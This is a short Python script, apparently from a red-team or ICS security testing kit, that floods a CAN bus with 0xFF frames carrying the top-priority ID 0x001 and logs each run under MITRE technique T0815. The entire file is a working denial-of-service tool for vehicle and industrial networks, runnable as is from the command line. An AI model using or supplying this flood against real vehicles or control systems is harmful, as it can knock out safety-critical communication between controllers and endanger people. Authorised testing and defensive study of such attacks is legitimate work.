#!/usr/bin/env python3

import os, argparse, time, json
from datetime import datetime
import can

LOG_FILE = "results/can_dos_logs.json"
MITRE_TTP = "T0815"

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            entries = json.load(f)
    else:
        entries = []
    entries.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(entries, f, indent=2)

def dos_can(interface="can0", loop_count=1000):
    try:
        bus = can.interface.Bus(channel=interface, bustype='socketcan')
        msg = can.Message(arbitration_id=0x001, data=[0xFF]*8, is_extended_id=False)
        for _ in range(loop_count):
            bus.send(msg)
            time.sleep(0.005)
        return True
    except Exception as e:
        print(f"[!] CAN DOS failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="CAN Bus Denial-of-Service Loop")
    parser.add_argument("--iface", default="can0", help="CAN interface (default can0)")
    parser.add_argument("--count", type=int, default=1000, help="Number of flood packets")
    args = parser.parse_args()

    result = dos_can(args.iface, args.count)
    log_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "interface": args.iface,
        "loop_count": args.count,
        "success": result,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
